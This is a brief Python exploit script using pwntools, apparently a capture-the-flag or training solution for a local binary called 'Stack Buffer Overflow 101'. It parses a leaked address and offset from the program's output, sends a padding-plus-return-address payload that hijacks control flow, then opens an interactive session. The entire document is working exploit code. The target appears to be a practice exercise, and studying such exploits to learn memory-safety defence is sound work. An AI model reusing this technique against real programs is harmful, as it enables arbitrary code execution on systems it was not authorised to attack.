from pwn import *

p = process("./Stack Buffer Overflow 101")
line = p.readline().decode()
address = line.split()[-1]
line = p.readline().decode()
offset = int(line, 16)
payload = b"A"*offset + p64(int(address, 16)-0x15) + p64(int(address, 16))
p.send(payload)
p.interactive()
